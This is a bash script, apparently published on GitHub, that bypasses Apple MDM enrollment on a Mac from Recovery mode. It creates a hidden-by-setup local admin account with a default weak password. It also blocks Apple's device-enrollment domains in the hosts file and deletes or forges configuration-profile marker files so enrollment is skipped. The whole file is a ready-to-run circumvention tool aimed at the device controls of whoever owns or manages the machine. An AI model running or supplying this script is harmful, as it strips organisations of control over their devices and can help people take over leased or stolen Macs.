#!/bin/bash

# Define color codes
MAG='\033[1;35m'
CYN='\033[1;36m'
YEL='\033[1;33m'
BLU='\033[1;34m'
GRN='\033[1;32m'
RED='\033[1;31m'
NC='\033[0m'

# What is the system volume name?
get_system_volume() {
    system_volume=$(diskutil info / | grep "Device Node" | awk -F': ' '{print $2}' | xargs diskutil info | grep "Volume Name" | awk -F': ' '{print $2}' | tr -d ' ')
    echo "$system_volume"
}

# System volume name
system_volume=$(get_system_volume)

# Display header
echo -e "${RED}Bypass MDM (https://github.com/rnddave)${NC}"
echo ""

# Get user input
PS3='Please enter your choice: '
options=("Bypass MDM via Recovery" "Reboot & Exit")
select opt in "${options[@]}"; do
    case $opt in
        "Bypass MDM via Recovery")
            # Bypass MDM via Recovery
            echo -e "${BLU}Bypass MDM via Recovery"
            if [ -d "/Volumes/$system_volume - Data" ]; then
                diskutil rename "$system_volume - Data" "Data"
            fi

            # Create a fake admin user
            echo -e "${NC}Create a Fake User"
            read -p "Enter Fake Fullname (Default is 'Apple'): " realName
            realName="${realName:=Apple}"
            read -p "Enter Fake Username (Default is 'Apple'): " username
            username="${username:=Apple}"
            read -p "Enter Fake Password (Default is '12345'): " passw
            passw="${passw:=12345}"

            # Create User
            dscl_path='/Volumes/Data/private/var/db/dslocal/nodes/Default'
            echo -e "${GRN}Creating Fake User"
            dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username"
            dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UserShell "/bin/zsh"
            dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" RealName "$realName"
            dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UniqueID "501"
            dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" PrimaryGroupID "20"
            mkdir "/Volumes/Data/Users/$username"
            dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" NFSHomeDirectory "/Users/$username"
            dscl -f "$dscl_path" localhost -passwd "/Local/Default/Users/$username" "$passw"
            dscl -f "$dscl_path" localhost -append "/Local/Default/Groups/admin" GroupMembership $username

            # Block the MDM domains
            echo "0.0.0.0 deviceenrollment.apple.com" >>/Volumes/"$system_volume"/etc/hosts
            echo "0.0.0.0 mdmenrollment.apple.com" >>/Volumes/"$system_volume"/etc/hosts
            echo "0.0.0.0 iprofiles.apple.com" >>/Volumes/"$system_volume"/etc/hosts
            echo -e "${CYN}Successfully blocked MDM & Profile Domains"

            # Remove any current configuration profiles
            touch /Volumes/Data/private/var/db/.AppleSetupDone
            rm -rf /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
            rm -rf /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
            touch /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
            touch /Volumes/"$system_volume"/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound

            echo -e "${CYN}MDM has been bypassed!${NC}"
            echo -e "${NC}Exit terminal and reboot your iDevice.${NC}"
            break
            ;;
        "Reboot & Exit")
            # Reboot & Exit
            echo "Lets go..."
            reboot
            break
            ;;
        *) echo "Invalid option $REPLY" ;;
    esac
done
